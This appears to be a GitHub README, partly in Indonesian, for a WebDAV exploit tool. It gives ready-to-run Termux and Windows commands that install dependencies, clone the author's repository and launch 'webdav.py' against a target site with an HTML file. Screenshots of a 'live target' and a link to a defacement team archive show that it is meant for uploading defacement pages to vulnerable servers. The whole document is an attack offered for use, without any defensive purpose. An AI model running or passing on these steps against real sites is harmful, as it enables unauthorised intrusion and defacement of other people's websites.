# Exploit Webdav Windows & Termux Working

# Eksekusi via Termux

pkg update && pkg upgrade

pkg install python2

pkg install openssl curl

pkg install libcurl

pip2 install urllib3 chardet certifi idna requests

git clone https://github.com/boychongzen18/webdav.git

cd webdav

chmod +x webdav.py

python2 webdav.py sitevuln.com xroot.htm

# Screenshot Via Termux
![be](https://raw.githubusercontent.com/boychongzen18/webdav/master/termux.png)
# Screenshot Live Target 
![be](https://raw.githubusercontent.com/boychongzen18/webdav/master/termux1.png)

================================================================================
# Eksekusi via Window

Download Python27 : https://shortid.co/bFWBm

git clone https://github.com/boychongzen18/webdav.git

cd webdav

chmod 777 webdav.py

python webdav.py sitevuln.com xroot.htm

# Screenshot Via Windows
![be](https://raw.githubusercontent.com/boychongzen18/webdav/master/webdav.png)

# Screenshot Target Webdav
![be](https://raw.githubusercontent.com/boychongzen18/webdav/master/target.png)

My Youtube    : https://www.youtube.com/channel/UCKdOPQ_iIXcqK17PB_2RMdQ

Link Tutorial : https://youtu.be/XZBFwgC05ow

My Website    : http://hackingforlive.cf,,https://hackingforlive.wordpress.com

My Facebok    : https://web.facebook.com/xroot.xroot.7

MyTeam HFL    : https://defacer.id/archive/team/hackingforlive

# Moto : Berbagi Itu Indah

# Regard Boychongzen aka Xroot
